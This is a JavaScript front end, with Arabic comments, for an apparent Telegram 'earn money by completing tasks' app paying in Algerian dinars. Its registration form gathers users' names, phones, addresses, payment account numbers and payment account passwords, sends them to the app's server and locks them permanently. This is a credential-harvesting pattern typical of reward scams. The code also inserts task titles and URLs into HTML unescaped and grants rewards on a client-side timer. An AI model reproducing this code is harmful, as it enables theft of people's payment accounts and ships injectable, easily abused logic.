const tg = window.Telegram.WebApp;
tg.expand();
const userId = tg.initDataUnsafe.user?.id;

document.addEventListener('DOMContentLoaded', async () => {
    if (!userId) return; // يجب الفتح من تيلجرام

    // جلب بيانات المستخدم
    const res = await fetch(`/api/user/${userId}`);
    const user = await res.json();

    // إذا كانت بيانات الدفع مقفلة (يعني سجل سابقاً) -> اذهب للوحة المهام
    if (user.paymentLocked) {
        document.getElementById('registration-section').style.display = 'none';
        document.getElementById('main-dashboard').style.display = 'block';
        
        document.getElementById('balance').innerText = user.balance.toFixed(2);
        document.getElementById('user-ref').innerText = user.refCode;
        loadTasks();
    } else {
        // إذا لم يسجل -> اظهر نموذج التسجيل
        document.getElementById('registration-section').style.display = 'block';
    }
});

async function saveProfile() {
    const data = {
        userId: userId,
        fullName: document.getElementById('reg-name').value,
        phone: document.getElementById('reg-phone').value,
        address: document.getElementById('reg-address').value,
        paymentMethod: document.getElementById('reg-method').value,
        paymentAccount: document.getElementById('reg-account').value,
        paymentPassword: document.getElementById('reg-pass').value
    };

    if(!data.fullName || !data.paymentAccount || !data.paymentPassword) {
        alert("الرجاء ملء جميع الحقول!"); return;
    }

    if(confirm("⚠️ هل أنت متأكد من معلومات الدفع؟ لن تتمكن من تغييرها لاحقاً.")) {
        const res = await fetch('/api/user/update', {
            method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data)
        });
        const json = await res.json();
        if(json.success) location.reload(); // إعادة تحميل للدخول للوحة
        else alert(json.error);
    }
}

async function loadTasks() {
    const res = await fetch('/api/tasks');
    const tasks = await res.json();
    const container = document.getElementById('tasks-list');
    container.innerHTML = "";
    
    tasks.forEach(t => {
        container.innerHTML += `
        <div class="glass task-row">
            <div>
                <h4>${t.title}</h4>
                <span style="color:#fbbf24">+${t.reward} DZD</span>
            </div>
            <button class="btn" onclick="doTask('${t.id}', '${t.url}', ${t.seconds})">بدء</button>
        </div>`;
    });
}

function doTask(id, url, sec) {
    tg.openLink(url);
    setTimeout(async () => {
        // هنا يمكن إضافة مؤقت حقيقي
        const res = await fetch('/api/claim', {
            method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({userId, taskId: id})
        });
        const json = await res.json();
        if(json.success) { alert("✅ مبروك!"); location.reload(); }
    }, sec * 1000);
}
